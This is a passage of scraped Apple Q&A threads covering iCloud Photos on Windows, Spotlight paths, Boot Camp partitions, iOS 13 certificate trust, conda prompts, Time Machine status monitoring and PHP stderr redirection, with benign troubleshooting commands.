Photos\",\"FirstRun.Contents.Message\":\"The\n  Photos app works seamlessly with iCloud to keep all your photos and\n  videos safely stored and up-to-date on the web, iPhone, iPad,\n  iPod touch, and Mac.\",\"FirstRun.NotEnabled.Advice\":\"To use Photos, go\n  to iCloud Settings on your iOS device, tap on Photos, and turn on\n  iCloud Photos.

Based on some googling of the bold text above I think this is what it looked like to me hence the confusion:\n\n\nA: Here is what you need:\nBefore you get started, you need to sign in to iCloud with your Apple ID. Just follow the setup instructions for your iPhone, iPad, or iPod touch or Mac. Then follow these steps to turn on iCloud Photos on your PC with Windows 7 or later.\nTurn on iCloud Photos\n\n\n*\n\n*Download iCloud for Windows.\n\n*Open iCloud for Windows.\n\n*Next to Photos, click Options.\n\n*Select iCloud Photo Library.\n\n*Click Done, then click Apply.\n\n*Turn on iCloud Photos on all of your Apple devices.\n\n\n\nUpload your photos and videos to iCloud Photos\nYou can upload your photos and videos from your PC to iCloud Photos when you follow these steps:\n\n\n*\n\n*Open a File Explorer window.\n\n*Under Favorites, click iCloud Photos.\n\n*Click Upload photos and videos.\n\n*Choose the photos and videos you want to upload and click Open.\n\n\nYou can also drag and drop photos and videos from your PC into the Uploads folder in iCloud Photos. You can view the photos and videos you uploaded in the Photos app on iCloud.com and on all your Apple devices.\nDownload your photos and videos from iCloud Photos\nNew photos and videos you add to iCloud Photos will automatically download to your PC. You can also download your collection by year when you follow these steps:\n\n\n*\n\n*Open a File Explorer window.\n\n*Under Favorites, click iCloud Photos.\n\n*Click Download photos and videos.\n\n*Choose the photos and videos you want to download and click Download.\n\n*Your photos and videos download to the location you set in iCloud Photos Options.\n\n", "Q: How can I use spotlight search to open a specific file path Is there a way to do Command+Spacebar to open the spotlight search on macOS Mojave, and then give the path of a folder you want to open? \nFor example:\n \"open ~/Documents/File\"\n\nor some equivalent.  \nIf this isn't possible by default are there any extension to do this?  I was looking at Flashlight but was unsure if I needed it. \n\nA: If you open Spotlight and type in the path of a specific folder and hit return that folder will open on your desktop in Finder. Put the full pathname but don't put open in the Spotlight search window.\nExample: To open my python folder I type the following in the Spotlight window.\n/User/myname/python . Now when I hit the return key the folder opens.\n\n", "Q: Deploy Studio Error - Network Unreachable I am deploying some laptops for the users in our company but there is an error which occurs every time.\nWhen I enter the recovery mode, the device tries to connect to the deploy server to retrieve an IP address. Indeed, this fails and shows a message which says \n\n\"Network is unreachable\".\n\n\nA: You should check to see if the network is available before entering Deploy Studio. \nFrom the Recovery Boot Menu (CMD-R boot method) open the Get Help option (it has the Safari logo) and try to navigate to a webpage. If that is unsuccessful, you don't have network access at all. \nIn that case, one issue might be that you need to register your device/MAC address with your company's network infra before getting access. I worked at a University and this was the case there. If you need help getting the MAC let us know.\nAdditionally, you could try connecting via ethernet.\nBest of luck.\n\nA: The problem was, that the MAC didn't detect the Ethernet cable as an Ethernet LAN (because we have it plugged in an adapter) cable anymore rather USB-c so i have just changed in the network utility option the settings to listen to the USB-c port. Then i entered the command \nipconfig set *interface name* dhcp\nIt is not the best solution, but a temporal saver\n", "Q: Unable to remove Windows Partition on Bootcamp I have a problem with removing the windows partition on bootcamp.\nUsing diskutil list, this was the result:\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *251.0 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                 Apple_APFS Container disk1         184.0 GB   disk0s2\n   3:       Microsoft Basic Data BOOTCAMP                66.2 GB    disk0s3\n   4:           Windows Recovery                         543.2 MB   disk0s4\n\n/dev/disk1 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -                      +184.0 GB   disk1\n                                 Physical Store disk0s2\n   1:                APFS Volume Macintosh HD            119.9 GB   disk1s1\n   2:                APFS Volume Preboot                 44.0 MB    disk1s2\n   3:                APFS Volume Recovery                517.0 MB   disk1s3\n   4:                APFS Volume VM                      1.1 GB     disk1s4\n\nI want to know the safest way to remove the Windows Partition because I am really confused on what all of this means. \n\nA: There are two ways.\nOption 1 (recommended):\nGo to Boot Camp Assistant, which is in the Utilities folder.

I've got a late 2015 iMac with a Bluetooth keyboard and mouse.  As part of the minimalist design, Apple appears to have eliminated all the indicator lights.  If the screen is black and the computer doesn't respond to either the keyboard or the mouse, how can I tell (a) a computer that's been turned off from (b) a computer where the batteries on the keyboard and mouse have run down?\nIf the computer is off, I don't want to turn it on, so pressing the power switch is out.\n(This question came up in the context of unplugging the computer from a malfunctioning UPS, where I couldn't tell if the UPS had shut the computer off or not.  If the computer was off, I didn't want to turn it on and risk having the UPS shut it off again halfway through the startup routine; if it was on, I wanted to shut it down properly before unplugging it.)\n\nA: As you have the iMac on a UPS, you could use the power consumption readout that is usually available on a UPS. I.e. if the power draw is above a few watts, the computer is on - if it's not, the computer is off.\nAnother option is simply to connect a cabled, USB mouse/keyboard instead of the Bluetooth. As having a malfunctioning UPS at the exact same time your mouse runs out of battery, whilst also being the exact same time your keyboard runs out of battery, is quite rare. Therefore it shouldn't be a problem to spend a little extra time plugging it in USB.\nA third option is using a cabled network or WiFi connection to check if the Mac is powered on. You could do that by for example pinging the Mac from another computer, smartphone or tablet. If it responds to pings, it is powered up - otherwise it is powered down. Obviously the computer needs to be connected to the same network in advance for this to work.\nA fourth option is to use another computer or specialized hardware to check for Bluetooth/WiFi signals being emitted from the computer. This only happens when the Mac is powered.\nA fifth option is to use temperature-sensing equipment (depending on your scenario, it could be your hands) - to sense/feel if the iMac is warmer than room temperature or not. If it is warm, it is powered (or was recently powered).\nAnd finally, if your Bluetooth keyboard is actually an Apple keyboard, then you can press the caps-lock key to detect if the keyboard battery is dead. If the keyboard is not dead, then you can use it to check if the iMac is powered on. If the keyboard battery is dead, you can recharge it.\n", "Q: After loading 5-10 websites, Safari and all other browsers stop trying to load pages After the recent macOS update, I am running into a problem where after browsing to about 5 different URLs, Safari is unable to load any sites. It doesn't matter if I use one tab or multiple tabs. This is not a network issue as I can still ping, etc. from the command line. In addition, it doesn't matter if I use Safari, Chrome, or FireFox. Once the problem starts with one it impacts the others as well. If I reboot the Mac then it resets.\nHere is one of the weird things about it: Let's say I open Google in one tab. I then open another tab and after a few sites I can't navigate, in the tab with Google the search sometimes still loads a new page, but the suggestion auto-complete will still work, for terms I've never typed before so it is not something in the history. This indicates to me that it is not a network access issue as it is clearly still going to Google.\nIf I open Dev Tools and go to the network tab, then click a link or type in a url, nothing happens; the browser doesn't even seem to be trying to issue an HTTP request anywhere. The progress bar goes about 15% and hangs there for the page load.\nThis only started happening after the last macOS update.\nOther things I've tried so far:\n\n\n*\n\n*Checked to ensure I have enough free space on HD\n\n*Flushed the DNS Cache and cleared history\n\n*Disabled DNS pre-fetch\n\n*Tried a different DNS server like 1.1.1.1 / 8.8.8.8\n\n*Confirmed that the network still works\n\n*Confirmed I have no proxy, no browser addons/extensions\n\n*Confirmed no VPN\n\n\nI am looking for some more suggestions or things to check besides the basics you see in every web article. It really doesn't seem like a network issue. Is there some system-wide service that would impact requesting or rendering of websites regardless of the browser?\n\nEdit: Turned out the SOCKS proxy got re-enabled by something and this was causing another bug, when this was disabled then the other problem and the above problem went away.\n\nA: The solution is this case was to disable the SOCKS proxy.\n", "Q: Samsung SSD with Catalina or Mojave I have High Sierra installed from a USB bootable drive on a Samsung SSD\n(Samsung MZ-76E500B/EU 500 GB 860 EVO Sata III 64L V NAND Solid State Drive) but I need XCode and that needs to be on Mojave 10.14.4+ and because i have a third party SSD the app store blocks me from upgrading. \nSo I put a Catalina beta on a USB drive but when I load up the iMac holding option and select the drive I just get a cancel symbol. \nNot sure what to do to get a more modern OS on this SSD? Anyone had any luck with Mojave or will that be the same?\nThanks in advance\n\nA: It would appear the issue is with compatibility, it is a Mid-2011 27 iMac so no longer supports Mojave or Catalina\nhttps://eshop.macsales.com/guides/Mac_OS_X_Compatibility\nDamn.\n", "Q: Can Google Photos on iOS use mobile data connection to back up? For some reason, I already turned on Mobile Data for Google Photos in iPhone settings, but it still says \"Waiting for Wifi\" in the app.\nAfter I turned on Wifi, and tapped on the backup button, and went to another app, the backup didn't run in the background for the first time. The second time, it did run in the background. Is there a way to make it always back up in the background?\n\nA: \nBack up on mobile data: If you don’t want to wait for Wi-Fi to back up your photos, under “When to back up”, tap Use cellular data to back up photos or Use cellular data to back up videos. Charges from your service provider may apply if you upload using your mobile network.\n\nfrom https://support.google.com/photos/answer/6193313?hl=en&ref_topic=6156061&co=GENIE.Platform%3DiOS&oco=1\nAlso, turn off low power mode for background backup\nAs OP puts it nicely: \n\n...the key is: you have to allow iOS to allow mobile data, and allow the Google Photos apps to use mobile data, so there are 2 settings to be touched. [..] we can have on/on, off/off, on/off, and off/on, and only on/on allows using mobile data...\n\nFrom: Can Google Photos on iOS use mobile data connection to back up?\n", "Q: How to record screen with the audio coming from your Mac? I'm trying to record my screen and the audio only coming from my Mac. \nWhen I do a screen recording with quicktime, with audio settings: internal microphone, it records the video but with a lot of external noise (like cats).\nHow do I make sure that the audio of what is being played on the screen (like music being played on my Mac) is recorded in the video file? \nI don't care if I'll have to record the screen and audio separately, or plug in earphones etc, I'd like to have a simple answer. \nI have already tried the suggestions in these other questions:\n\n\n*\n\n*How to record both screen and sound with Quicktime?\n\n*How to record the sound also in a screen recording if the headphones are connected?\n\n*QuickTime Screen + Audio Capture\nSadly their solutions don't work for me, as my recordings still capture external noises on macOS Catalina.\nWhat software or setup can do this?\n\nA: Try using Background Music.\nWhen recording with Quicktime click the arrow and change the microphone to Background Music.\n\nYou can record system audio with Background Music. With\nBackground Music running, launch QuickTime Player and select File > New Audio Recording (or New Screen Recording, New Movie Recording). Then click the dropdown menu (⌄) next to the\nrecord button and select Background Music as the input device.\nYou can record system audio and a microphone together by creating an\naggregate device that\ncombines your input device (usually Built-in Input) with the\nBackground Music device. You can create the aggregate device using the Audio MIDI Setup utility under\n/Applications/Utilities.\n\nEdit: If you have homebrew installed you can install using brew install --cask background-music\nsource\n\nA: Just came to post a solution that worked for me. (Caution) It does require a paid subscription though.\nI tried Loom (the screen recording software) & their macOS app has a setting to enable system audio. Turn that on.\nThen, make sure your microphone is set to None & then record!\nThe only negative really is that you have to pay to use it for any reasonable amount of time... But hey it worked for me & personally for me this whole situation is such a headache that it's worth it for the saved time & headache. Not a sponsor or anything, just wanted to share my own personal found solution.\n\nA: This isn't an answer; @Roxiun's answer really helped me, these are some tips I learned that also helped\nFirst, follow @Roxiun's answer and install Background Music. Then..\nFamiliarise yourself with the tools\nIf, like me, you have several possible audio inputs and outputs, it can be a little confusing, but the three things to tinker with are:\n\n*\n\n*An application on your mac called 'Audio MIDI Setup'\n\n*Background Music application (note that to access its options, click on the little circles icon in the mac menu bar (i.e. top of your mac screen)\n\n*After starting a new screen recording using Quicktime, there's a little menu will pop up on screen, which has an 'Options' section\n\nOther quick tips\nThese are really convenient shortcuts to remember:\n\n*\n\n*To start a screen recording: command + shift + 5\n\n*To end a screen recording: command + control + escape\n", "Q: How do you connect to a Samba share from macOS when using a Microsoft account? I've set up Samba so that it uses the same username and password as my Microsoft account, so on Windows authentication is automatic when opening shares. However, with the same configuration I can't connect from macOS 10.14, getting an authentication error.\nI'm serving from Ubuntu 19.04 with samba 4.10.0+dfsg-0ubuntu2.4.\n\n\n*\n\n*There's a regular linux account for each user, with the username set to user@example.com.\n\n*The linux accounts have the shell set to /usr/sbin/nologin.\n\n*The password is set to the same password as the Microsoft account.\n\n*Samba accounts have also been added, with the same user name and password.\n\n\nWhen I connect from Windows 10, I see it sends a domain of MicrosoftAccount and it works fine.

things, so I would roll those back. If you want to lightly bind the user account to a directory, you can look at things like Apple Enterprise Connect or NomAD or Jamf Connect. Binding the mac to AD causes a lot of pain, so most pros avoid that now and use a different tool if you can’t just use the out of the box setup with Keychain.\nMy only guess at this point is you somehow need to federate the directory services on linux to ADFS / Microsoft online to get that pairing to work.

I do not need to be particularly careful to the old Mac when taking out the CD drive.\nHowever, I want to know whether there is any way to connect the isolated CD drive to a newer Mac. The reason is simple: I have a bunch of DVDs but no optical drive other than the one inside the broken Mac. \nIf so, what kind of hardware (e.g. cable) and software (e.g. any special program or setup?) would I need?\n\nA: The MacBook Pro internal SuperDrive uses a standard SATA connector. You should be able to use any SATA > USB cable to mount the SuperDrive externally.\nIt was a common modification to replace a MacBook's SuperDrive with a second Hard Drive. Those people then had the option to use the SuperDrive externally, as in the video below:\n\nConnect your Macbook superdrive / optical externally via USB\nhttps://www.youtube.com/watch?v=UEcpomwJbHc\n\n\nA: Why not just get a carrier for the SuperDrive?\n\n\n*\n\n*https://eshop.macsales.com/item/OWC/VLSS9TOPTU2/\nSaves you from opening or worrying about the mounting and internal cables on the second Mac.\nThere are less expensive cable options to get SATA to USB as well:\n\n\n*\n\n*https://www.newmodeus.com/shop/index.php?main_page=index&cPath=17\n", "Q: How to make second monitor go black? I have a second display connected to my iMac and I want to make it go black some times, for example if I am watching a movie on the first monitor. \nApparently, there has been an app called Screen Commander but it is not available any more. \nI run macOS High Sierra on an iMac from 2010 and have a 24\" Apple Cinema Display attached via Mini Display Port, of course.\nI can not imagine why there is no tool which does this! I know I can set up different spaces for the monitors but this is not what I want. \n\nA: If you use VLC for playback, it has two options to black the other screen during fullscreen playback.\nUse native fullscreen mode,  or\nBlack screens in Fullscreen mode  \nThey are mutually exclusive, enabling native fullscreen disables the other.\nNative requires a restart of the app, 'black screens' can be switched on & off at will.\nI haven't tested, but one may work better than the other depending on whether you have Spaces set to move in pairs or separately, in Mission Control prefs.\n\n", "Q: Why can’t one develop apps on a mobile platform? I would like to try to create iPhone apps on an actual iPhone. Why isn’t this supported by Apple? \n\nA: I suspect this will be considered off-topic for the site, but nevertheless…\nAs it currently exists, Xcode is completely incompatible with iOS. Presumably at some in the future there will be some way to develop at least with Swift on iOS.\nThe only real answer is, of course, that no one who knows the answer to this can or will say, so there can be no real answer to this other than \"Xcode doesn't run on iOS\" which doesn't explain why Apple hasn't made it possible to develop for iOS on iOS before now.\n", "Q: How to send a voice message handsfree in iMessage? How can you send a voice message on iPhone handsfree?\nThe time I want to record a voice message is precisely when I can't use hands, but the iMessage app has a button that you have to Tap and hold to record and send audio.\nIs there a way to record one without having to hold down the button?\nNote: I don't want to dictate a text message, I want to send an audio message.\n\nA: I just figured this out today! You press the audio message button and then you swipe left and it will record without having to long hold. It will only record when your phone is unlocked, so tap your screen if you want it to be longer than your auto-lock, or change your auto-lock settings. Hope this helps, even though it’s delayed.\n", "Q: Some photos from iCloud Photos after backup mysteriously disappeared I bought an iPhone XS a month ago. On my old iPhone I made an iCloud Backup, then I deleted everything and gave my old iPhone to my mom (I don't use that iPhone anymore). \nAfter checking in iCloud Photos on my Mac I confirmed absolutely every photo was there. On my new iPhone XS I chose the option \"Restore from iCloud\", all apps were restored, but unfortunately not all photos and videos. \nI noticed this a few weeks later when I was looking for something. I was shocked that 30-40 files (videos & photos) were not downloaded from iCloud Backup. I tried repeatedly to restore them somehow, but I failed. \nI know I didn't delete them, they just disappeared mysteriously after I backed up to iCloud. \nThese 30-40 photos are also now not available in iCloud Photos on my Mac. I do not know why. I am very sad because these were photos and videos from a long-awaited concert.\nHow can I recover these missing files?\nCan I see the iCloud Photos upload history somehow?\n\nA: Yes - sign in to iCloud from a computer browser and you can see all photos that have been deleted in the past 30 days (or a little more some times).\niOS and macOS version of Photos can also show the deleted items album if you toggle it in preferences or choose it if it’s enabled.\nThis is covered in the “What if some photos are missing” section of this guide to iCloud Photos:\n\n\n*\n\n*https://support.apple.com/en-us/HT204570\nBarring that, you’d need a backup from before the photos were deleted to get them back.\n", "Q: Internet Recovery booting to old OS I need to reinstall macOS on my 2011 iMac. The iMac was last running High Sierra (which is the last OS it supports) before I wiped it. I am booting into Internet Recovery mode on my iMac, but for some reason the computer seems to be retrieving Lion from Internet Recovery. This would normally be fine (I could just install Lion and then upgrade to High Sierra through the Mac App Store), but in order to install Lion, the installer asks for my Apple ID and password. I type my credentials in correctly, but the installer seems to be so old that it is unable to communicate with the Mac App Store properly, so it rejects my credentials and doesn't proceed with the installation.\nIs there a way to get Internet Recovery to boot into High Sierra?\n\nA: Since macOS Sierra 10.12.4 Apple has provided three different macOS Recovery options. These are described below:\n\n\n*\n\n*commandR to reinstall the latest macOS that was installed on your Mac, without upgrading to a later version \n\n*optioncommandR to upgrade to the latest macOS that is compatible with your Mac\n\n*shiftoptioncommandR to reinstall the macOS that came with your Mac, or the version closest to it that is still available\n\n\nSo, the best options if you're wanting to install macOS High Sierra from Recovery mode is to use the:\n\n\n*\n\n*commandR shortcut (since that's the last version of macOS you had installed), or the\n\n*optioncommandR shortcut as that's the one for installing the latest macOS compatible with your hardware.\n\n", "Q: Impossible to redirect subprocess stderr on macOS Running following in Terminal on macOS Mojave\nphp -r 'foo();' 2>/dev/null\n\nProduces\nFatal error: Uncaught Error: Call to undefined function foo() in Command line code on line 1\n\nError: Call to undefined function foo() in Command line code on line 1\n\nCall Stack:\n    0.0002     390016   1. {main}() Command line code:0\n\nBut on Ubuntu Xenial and FreeBSD it produces no output, which is expected, as I am silencing the error. I tried with zsh 5.7.1, default bash 3.2.57 and bash 5.0.11. I'm interested why is this the case on macOS.\nAnother interesting thing here is that when redirecting both stdout and stderr, then there is finally no output. But redirecting neither stdout nor stderr has the silence effect.\nSome more info:\n➜  ~ type php\nphp is /usr/local/bin/php\n➜  ~ file $(type -p php)\nphp:                cannot open `php' (No such file or directory)\nis:                 cannot open `is' (No such file or directory)\n/usr/local/bin/php: Mach-O 64-bit executable x86_64\n➜  ~\n\n\nA: This particular behaviour have nothing at all to do with any \"impossibility\" of redirecting subprocess stderr on macOS. It is not impossible, and works like you would expect - i.e. similar to Linux and FreeBSD.\nThe gotcha here is that you're using different PHP configurations on those setups. It seems you're not using the stock supplied PHP, but rather something else - but I'll explain according to the stock PHP considering that the same will apply to a custom install.\nThe way PHP works is that it outputs these types of errors messages according to the setting of the \"display_errors\" configuration directive. You can choose to either mute it completely (i.e. never output the error), output to stdout (the default) or output to stderr.\nYou'll commonly set the value of display_error in /etc/php.ini - if you haven't got a php.ini file, or display_errors is not set in it, it will default to stdout. If you're using a custom built php, the location of the php.ini file will vary.\nYou can test this out by performing the following in the Terminal:\nphp -r 'foo();' 2>/dev/null\n\nProduces\nFatal error: Uncaught Error: Call to undefined function foo() in Command line code:1\nStack trace:\n#0 {main}\n  thrown in Command line code on line 1\n\nHowever running:\nphp -d'display_errors=stderr' -r 'foo();' 2>/dev/null\n\nProduces no output.\nYou can also use 1>/dev/null to redirect stdout, and then you'll see that the behaviour reverses between those two examples.\nNote also that the setting \"on\" for display_errors is the same as \"stdout\".\n", "Q: Shortcuts App (iOS 13.1.2): How to prevent that the shortcuts app interface opens, when you start a shortcut from the homescreen?

If you turn this option off, it will prevent from opening the shortcuts app.\n\nI hope this helps,\n", "Q: Can I have /Users as my home folder?

Frequently, and for no apparent reason, my Macbook Pro 15,1 (15-inch, 2019) with macOS 10.14.6 freezes, then hard-crashes during video chats (hangouts, slack, FaceTime). I have not seen this problem during regular video playback (Youtube, VLC). The error report is attached at the bottom.\nI had hoped it has to do with integrated graphics switching, but turning it off didn't prevent it from happening.\nCan someone parse some useful info from this crash report?\nhttps://pastebin.com/raw/9zTnntxv (too large to paste here, unfortunately).\n\nA: The most useful info from the crash report is simply that it is not your main macOS system that crashed. It is the bridgeOS running on your T2 chip that has crashed. The T2 on your system is, amongst other things, responsible for image processing for the integrated camera.\nTherefore it does not seem that looking into the GPU, integrated graphics switching or similar will have an effect on the problem. This seems very likely to be an Apple bug, which will be hard to avoid triggering. In other words - you'll need to downgrade/upgrade the OS on the T2 to get this fixed.\nI would advise reaching out to Apple to report the matter, and hope for a speedy upgrade from them that fixes this.\n\nA: This problem disappeared after some OS update (within the same major OS version, I'm still on 10.14.6). So in case anyone still experiences this, try to install all updates.\n\nA: This is a hardware issue (I have suffered with the same problems since March 2019), you should contact your Apple service center or file a complain to your country's Apple importer and ask to conduct an independent examination of your Macbook to get a confirmation of hardware issues with your Macbook. \nThen you can get your money back or sue Apple in your country of residence.\n", "Q: Why does iOS 13 not trust my own Root CA? No matter what I do, I can't get Safari on the iPhone or iPad to trust a certificate from an internal website. I can look at the certificate and it is shown as \"not trusted\".\nI have imported the Root CA, and I enabled trust for the Root CA. This worked before with iOS 12, but no longer seems to be enough.\nThe tool \"SSL Detective\" shows a trusted certificate chain. Safari on the Mac has no issues with the website / certificate (of course, the Root CA had to be imported to the keychain first).\nIs this a bug in iOS 13.1.1? Or are there even more hurdles that I don't know of to enable an internal CA?\n\nA: I myself am working on this for days now. 2 whole weekends without any luck.\nSo right now I try to get faith again. (to get iOS 13 and iPadOS to accept a certificates descendent from a self-signed root-ca)\nMy conclusion after wasting 2 full weekends was right. The pki-tree and certificates were right.\nThe main reason that the certificateson iOS were not accepted was because Apple decided to add an additional security option for that in a completely different area!  ( I'm pissed off by Apple in my 10+ years using Apple-Devices ). That's somthing I would expect from Win10 not iOS13 and iPadOS.\nFor others that are stuck with this.\n\n\n*\n\n*Step1) Upload your root-ca to you iOS/iPadOS-device (by Airdrop, email, ...)\n\n*Step2) Airdrop asks for Installation else open in Files-App\n\n*Step3) Goto Settings > General > Profiles and install the proposed cert & enter you passcode (not finished yet)\n\n*Step4) Goto Settings > Info > \"Certificate-Settings\"\n\n*Step5) activate the open certificate\n\n\nThe new splitted menus are a bit of a pain and not really intuitive.\nThat's that.\n\nA: iOS 13 have increased the security regarding these root certificates. It is thus not a bug, but rather that you have to meet higher requirements in order to get this working.\nFirst of all the process for manually trusted the root certificate has been made slightly more complicated to ensure that users do not unwittingly do this. Before you could import a profile and be done with it, but now you have to also open up Settings > General > About > Certificate Trust Settings, and then toggle \"Enable Full Trust for Root Certificates\" on for the certificate. \nIn addition to the above mentioned process change, the requirements for the actual certificate have changed as well:\n\n\n*\n\n*If you're using RSA, the key size must be at least 2048 bites.\n\n*The hash algorithm must be SHA-2, and not SHA-1.\nYou can read Apple's explanation of these new requirements here. Note that most of the requirements are only for \"server certificates\" - you only need to comply with the new requirements for \"issuing CAs\".\nAs per your comments, it seemed that your question title was really incorrect and it wasn't the \"root CA\" trust you had problems with - it was the server certificate that wasn't trusted. In this case, remember that the server certificate should follow all the new requirements listed in the above mentioned link.\nThese new requirements are, for all server certificates:\n\n\n*\n\n*When used for TLS (as you do in Safari), the DNS name of the server must be in the Subject Alternative Name field\n\n\nNote that this requirement also means that if you're requesting your web page using an IP-address instead of a name, then the IP address (without port number) should be listed in the SAN field.\nAnd for server certificates issued after the 1st of July 2019, also the following two requirements:\n\n\n*\n\n*When used for TLS, the certificate must contain an ExtendedKeyUsage field with the id-kp-serverAuth OID (i.e. don't use a certificate listed as a client certificate, code signing certificate, email or VPN certificate, etc)\n\n*When used for TLS, the certificate must be valid for 825 days or fewer\nAs it turned out your problem was with the validity period of the certificate being more than 825 days. You'll have to reissue the certificate with a shorter validity period.\nThe reason for the new validity period requirement is that the global CA/B forum (regulates the industry for digital certificates) set new guidelines where CAs must not issue server certificates with a validity period of more than 825 days after the 1st of March 2018. For more information on who was behind the new rule, you can find the voting information here.\n\nA: In iOS 13, which had been released on September 19, 2019, Apple has chosen to retroactively invalidate certain certificates that have been issued after July 1, 2019.\nIn particular, a certificate is affected if it has a validity period of more than 825 days.\nIf you have such a certificate, it will no longer work after the update to iOS 13.\nIn this case I would call it a bug in iOS 13.\n", "Q: How do I remove the source (base) from my terminal? I created some new aliases in my .bashrc file and did\nsource ~/.bashrc\n\nNow, everytime I open my terminal it always comes with the (base)\nHow do I remove that?\n\nA: That's the \"base\" environment from Anaconda or Miniconda. It means the Python environment from conda is enabled by default. \nThere're two solutions.\n\n\n*\n\n*Just disable the base environment, make sure your conda >= 4.6. Whenever you wanna use Python, enable an environment from conda manually with following command,\n# run this in an interactive shell\n# enable environment called \"base\", the default env from conda\nconda activate base\n# deactivate an environment\nconda deactivate\n\n\n*Enable the base environment, which is the default behavior of conda, but don't modify your prompt. Run the following command in an interactive shell once.\nconda config --set changeps1 false\n\n\nA: If you'd prefer that conda's base environment not be activated on startup, you can always set the auto_activate_base parameter to false:\nconda config --set auto_activate_base false\n\n\nA: The following code in the .bashrc file should initialize an anaconda environment. Just remove them.\n# >>> conda initialize >>>\n# !! Contents within this block are managed by 'conda init' !!\n__conda_setup=\"$('/Users/proshore/opt/anaconda3/bin/conda' 'shell.zsh' 'hook' 2$\nif [ $? -eq 0 ]; then\n    eval \"$__conda_setup\"\nelse\n    if [ -f \"/Users/proshore/opt/anaconda3/etc/profile.d/conda.sh\" ]; then\n        . \"/Users/proshore/opt/anaconda3/etc/profile.d/conda.sh\"\n    else\n        export PATH=\"/Users/proshore/opt/anaconda3/bin:$PATH\"\n    fi\nfi\nunset __conda_setup\n# <<< conda initialize <<<\n\n\nA: This happens due to the installation o Anaconda or Miniconda.\nDepending on your mac version, you can just add one more line at the end of \"~/.zshrc\" or \"~/.bashrc\" with vim or any of your fav editors.\nconda deactivate\n\nSave the file, and now whenever you open the terminal again you won't see (base).\n", "Q: Dynamically adjust image canvas for images I am new to Mac.\nIn Windows OS, I use MS Paint to dynamically adjust the canvas using the mouse by dragging the borders within the GUI to paste multiple cropped images into it to create a single new image.\nIs there a way to do this in macOS using Apple default or paid apps where I can dynamically resize the canvas using the mouse? Manually entering percentages or dimensions to resize the canvas (either in the app or in terminal) is confusing to me to achieve the right canvas size.\n\nA: You can use Patina app (http://www.patinaapp.com/) in MAC.\nThis costs around 3.5 euros but it closely resembles MS Paint of Windows OS in terms of being able to dynamically resizing image canvas, adding text, etc\nSadly, they do not have a trial version to try it out beforehand. But I bought it and it seems fine as of now\n", "Q: Time Machine monitoring app using data from the \"tmutil status\" command I'm sure the information is irrelevant to the question, but I'm running macOS 10.14.6.\nJust today I discovered the very interesting tmutil status Terminal command. For instance, while the menu bar icon merely displays \"Preparing backup\", this command provides actual progress information, similar to this:\nBackup session status:\n{\n    BackupPhase = ThinningPreBackup;\n    ClientID = \"com.apple.backupd\";\n    DateOfStateChange = \"2019-10-06 15:54:55 +0000\";\n    DestinationID = \"XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\";\n    DestinationMountPoint = \"/Volumes/XXX\";\n    NumberOfChangedItems = 2020012;\n    Percent = 0;\n    Running = 1;\n    Stopping = 0;\n}\n\nIt bears mentioning that this information is continually updated (as fast as I can rerun the command in Terminal), letting me know the backup is progressing, whereas the menu bar icon shows no progress at all during this phase.\nAnd after the actual backup starts, this is printed:\nBackup session status:\n{\n    BackupPhase = Copying;\n    ClientID = \"com.apple.backupd\";\n    DateOfStateChange = \"2019-10-06 16:14:36 +0000\";\n    DestinationID = \"XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\";\n    DestinationMountPoint = \"/Volumes/XXX\";\n    Percent = \"2.26301435425844e-05\";\n    Progress =     {\n        \"_raw_totalBytes\" = 68715697586;\n        bytes = 1727829;\n        files = 30385;\n        totalBytes = 75587267344;\n        totalFiles = 2093070;\n    };\n    Running = 1;\n    Stopping = 0;\n    \"_raw_Percent\" = \"2.514460393620488e-05\";\n}\n\nClearly this is much more information than the menu bar icon or System Preferences pane provides. On the other hand, it's not too user-friendly: one has to run the command periodically in Terminal, and parse the text output.\nIs there a GUI app that presents this information in an easier to read way, which is automatically updated?\n\nA: I have made a shell script to output of 'BackupPhase' from tmutil status to the menu bar, and then I have the rest of the information available if you click on the menu bar item.\nTo display the output of this script in the menu bar, you will need the excellent TextBar app, which costs $5 (IIRC) and is well worth it.\nHere's what it looks like right now (the \"ThinningPostBackup\" part is what is shown in the menu bar. The rest only appears when the menu bar item is clicked.)\nYou'll notice the top 3 sections are formatted, and then I just include all of the tmutil status information below (everything from \"Backup session status\" and below), because sometimes it might have interesting stuff in it, and I'm nerdy like that.\n\n\nI have put my TextBar / Time Machine script up on GitHub for anyone who would like to use or adapt it.\n\nA: to just see numbers running i use this:\nwhile sleep 1; do tmutil status; done\n\nthis creates an infinite loop. it displays the current status every second. you see the changes easy.\nto abort this script you can use the commond short cut for aborting a running command in the console:\n\n*\n\n*shortcut: control+c\n", "Q: Ugrading to a new iMac?

I'm fairy new to Macs, so what would be the best/easiest way to do this? The instructions for time machine seem quite straight forward.\n\nA: All the apps which you have previously purchased, and which are running on your present iMac, are available in the App Store for re-download. However, the best method for transferring your present user account(s) and apps to your new iMac is through Time Machine Migration Assistant, which will be one of the first options when you set up the new iMac out of the box. Make sure you have a current backup of your present machine and that the Time Machine device itself (External USB drive, etc) can be physically connected to the new iMac.\nJust recently I upgraded to a 2019 iMac myself, and because I have loads of Thunderbolt drives, including my main Time Machine drive, I had to purchase Apple Thunderbolt > USBC adapters to do the migration and continue to use the drive as the Time Machine backup disk.\n", "Q: What is an iPad app that will allow viewing AND editing/markup of PDF documents in multiple tab views?

I don’t know how to check whether my windows data is included when I set up time machine. I would love an answer that explains how I could tell this if possible, but if not, the main question follows. \nDoes Time Machine back up Bootcamp data by default?\n\nA: No, the BootCamp partition is not backed up by Time Machine.\nYou'll need to install a separate backup system for that. Either a Windows backup systems running on Windows when you use that system, or a Mac backup system that supports the file system you've used for Bootcamp (usually NTFS).\n", "Q: Mojave doesn't remember window position/size for a specific application?

